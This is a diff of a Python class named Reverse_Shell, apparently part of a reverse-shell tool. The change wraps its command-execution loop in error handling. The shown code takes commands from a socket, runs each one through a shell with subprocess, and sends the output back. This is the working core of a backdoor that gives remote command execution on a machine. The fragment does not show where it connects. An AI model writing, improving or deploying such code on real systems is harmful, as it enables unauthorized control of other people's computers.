@@ -2,6 +2,7 @@ import socket
 import subprocess
 import json
 
+
 class Reverse_Shell:
     global sock
     global command
@@ -36,16 +37,19 @@ class Reverse_Shell:
             if command == "q":
                 break
             else:
-                # creation of the command, see documentation
-                proc = subprocess.Popen(
-                    command,
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE
-                )
-                result = proc.stdout.read() + proc.stderr.read()
-                self.reliable_send(result)
+                try:
+                    # creation of the command, see documentation
+                    proc = subprocess.Popen(
+                        command,
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE
+                    )
+                    result = proc.stdout.read() + proc.stderr.read()
+                    self.reliable_send(result)
+                except:
+                    self.reliable_send("Can't execute the command")
 
     def end_connection(self):
         # close the socket
